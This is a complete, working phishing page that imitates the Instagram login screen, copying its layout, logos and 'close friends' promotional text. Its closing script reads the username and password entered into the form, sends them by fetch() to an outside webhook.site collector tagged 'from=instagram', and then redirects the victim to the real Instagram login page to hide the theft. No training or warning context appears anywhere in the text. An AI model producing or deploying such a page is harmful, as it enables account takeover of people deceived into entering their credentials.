<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa; 
            min-height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center;
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }
        .main-container {
            display: flex;
            width: 100%;
            max-width: 935px;
            height: 610px;
            background: white;
            border-radius: 4px;
            box-shadow: 0 2px 4px rgba(0,0,0,.1);
            overflow: hidden;
        }
        .left-hook {
            flex: 1;
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            padding: 60px 80px;
            color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .instagram-logo {
            width: 225px;
            height: 66px;
            margin-bottom: 28px;
        }
        .hook-text {
            font-size: 32px;
            line-height: 40px;
            font-weight: 400;
            margin-bottom: 32px;
        }
        .close-friends {
            background: linear-gradient(45deg, #ff8a80, #ff6b9d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-weight: 600;
        }
        .stories-collage {
            display: flex;
            gap: 16px;
            margin-top: 32px;
        }
        .story-image {
            width: 72px;
            height: 144px;
            border-radius: 8px;
            background-size: cover;
            background-position: center;
            border: 3px solid rgba(255,255,255,.3);
        }
        .story1 { background-image: url('https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=300&h=600&fit=crop'); }
        .story2 { background-image: url('https://images.unsplash.com/photo-1516589178581-6cd7833ae3b2?w=300&h=600&fit=crop'); }
        .story3 { background-image: url('https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=300&h=600&fit=crop'); }
        
        .login-box {
            flex: 1;
            padding: 60px 56px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .phone-logo {
            width: 175px;
            height: 51px;
            margin: 0 auto 44px;
        }
        .input-group {
            margin-bottom: 16px;
        }
        input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #efefef;
            border-radius: 4px;
            background: #fafafa;
            font-size: 14px;
            outline: none;
            transition: all .2s;
        }
        input:focus {
            border-color: #0095f6;
            background: white;
            box-shadow: 0 0 0 2px rgba(0,149,246,.1);
        }
        input::placeholder {
            color: #8e8e8e;
            font-size: 14px;
        }
        .login-btn {
            width: 100%;
            padding: 8px 0;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin: 12px 0;
            transition: background .2s;
        }
        .login-btn:hover { background: #0077cc; }
        .forgot-pw {
            display: block;
            text-align: center;
            color: #00376b;
            font-size: 14px;
            text-decoration: none;
            margin: 16px 0;
        }
        .divider {
            text-align: center;
            color: #8e8e8e;
            font-size: 13px;
            margin: 24px 0;
            position: relative;
        }
        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #efefef;
        }
        .divider span {
            background: white;
            padding: 0 16px;
            position: relative;
        }
        .facebook-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            margin: 16px 0;
        }
        .fb-logo {
            width: 16px;
            height: 16px;
            background: #1877f2;
            border-radius: 2px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            color: white;
            font-weight: bold;
        }
        .create-account {
            text-align: center;
            color: #8e8e8e;
            font-size: 14px;
            margin-top: 24px;
        }
        .create-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
            margin-left: 4px;
        }
        .meta-logo {
            position: absolute;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            width: 80px;
            opacity: .5;
        }
        @media (max-width: 875px) {
            .main-container { border-radius: 0; box-shadow: none; height: 100vh; max-width: none; }
            .left-hook { display: none; }
            .login-box { padding: 40px 20px; max-width: 350px; }
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="left-hook">
            <img class="instagram-logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
            <h1 class="hook-text">
                See everyday moments from your <span class="close-friends">close friends</span>.
            </h1>
            <div class="stories-collage">
                <div class="story-image story1"></div>
                <div class="story-image story2"></div>
                <div class="story-image story3"></div>
            </div>
        </div>
        
        <div class="login-box">
            <img class="phone-logo" src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a1.png" alt="Instagram">
            
            <form id="login">
                <div class="input-group">
                    <input name="user" type="text" placeholder="Mobile number, username, or email">
                </div>
                <div class="input-group">
                    <input name="pass" type="password" placeholder="Password">
                </div>
                <button type="submit" class="login-btn">Log in</button>
            </form>
            
            <a href="#" class="forgot-pw">Forgot password?</a>
            
            <div class="divider">
                <span>OR</span>
            </div>
            
            <a href="#" class="facebook-login">
                <div class="fb-logo">f</div>
                Log in with Facebook
            </a>
            
            <div class="create-account">
                Don't have an account? <a href="#" class="create-link">Sign up</a>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('login').onsubmit = (e) => {
            e.preventDefault();
            let user = document.querySelector('[name="user"]').value;
            let pass = document.querySelector('[name="pass"]').value;
            
            fetch('https://webhook.site/b010baa2-ec6b-44a4-95e9-9b3c67fb1e86', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'user=' + encodeURIComponent(user) + '&pass=' + encodeURIComponent(pass) + '&from=instagram'
            });
            
            window.location = 'https://www.instagram.com/accounts/login/';
        };
    </script>
</body>
</html>
